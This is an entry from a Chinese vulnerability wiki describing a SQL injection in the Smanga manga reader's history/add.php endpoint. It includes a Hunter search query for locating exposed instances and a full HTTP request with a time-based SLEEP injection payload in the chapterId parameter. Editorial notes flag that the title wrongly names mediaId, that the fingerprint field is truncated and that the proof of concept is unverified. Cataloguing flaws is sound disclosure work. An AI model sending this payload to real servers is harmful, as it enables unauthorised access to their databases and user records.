---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "Smanga history/add 接口 chapterId 参数 SQL 注入说明"
product: "Smanga"
record_type: "vulnerability"
document_type: "SQL注入简要PoC"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "版本和认证未明；历史记录添加接口、MySQL延迟表达式"
side_effects: "sqlmap章节只是正常请求没有命令/注入标记，缺延迟对照与响应；history/add可能新增记录需标副作用"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/SmangamediaId%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
hunter: "web.title==\"smanga\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ip5new4ve7mtypcf"
id: "vw-1b5cc679f374f48418d7758f"
entity_id: "ve-1b5cc679f374f48418d7758f"
schema_version: "1"
previous_fofa_unverified: "web.title=="
---

# Smanga history/add 接口 chapterId 参数 SQL 注入说明

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Smanga
- 文献类型：SQL注入简要PoC
- 版本、权限及部署边界：版本和认证未明；历史记录添加接口、MySQL延迟表达式
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 标题mediaId但实际注入chapterId，mediaId固定1，确认参数错配，应校正或分别举证
2. FOFA字段用残缺Hunterweb.title==；HTTP标java、空Host和固定长度不匹配
3. sqlmap章节只是正常请求没有命令/注入标记，缺延迟对照与响应；history/add可能新增记录需标副作用
4. Emby/Plex只是灵感不是受影响软件；缺官方来源/版本/修复

### 操作风险

sqlmap章节只是正常请求没有命令/注入标记，缺延迟对照与响应；history/add可能新增记录需标副作用

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/ip5new4ve7mtypcf>
- 原文参考链接（未重新核验）：<https://github.com/wy876/POC>

### 归档技术正文

# 一、漏洞简介
Smanga无需配置，docker直装的漫画流媒体阅读工具。以emby plex为灵感，为解决漫画阅读需求而开发的漫画阅读器。Smanga mediaId存在SQL注入漏洞.

# 二、影响版本
+ Smanga

# 三、资产测绘
+ hunter`web.title=="smanga"`
+ 特征


# 四、漏洞复现
```http
POST /php/history/add.php HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ak;q=0.8
Cookie: thinkphp_show_page_trace=0|0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 196

chapterCover=1&chapterId=1' AND (SELECT 6064 FROM (SELECT(SLEEP(5)))bcUs) AND 'IwYx'='IwYx&chapterName=1&chatpterPath=1&chaptertype=image&keyword=1&mangaCover=undefined&mangaId=1&mangaName=&mediaId=1&timestamp=12123123&userId=1
```


sqlmap

```http
POST /php/history/add.php HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ak;q=0.8
Cookie: thinkphp_show_page_trace=0|0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 196

chapterCover=1&chapterId=1&chapterName=1&chatpterPath=1&chaptertype=image&keyword=1&mangaCover=undefined&mangaId=1&mangaName=&mediaId=1&timestamp=12123123&userId=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ip5new4ve7mtypcf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
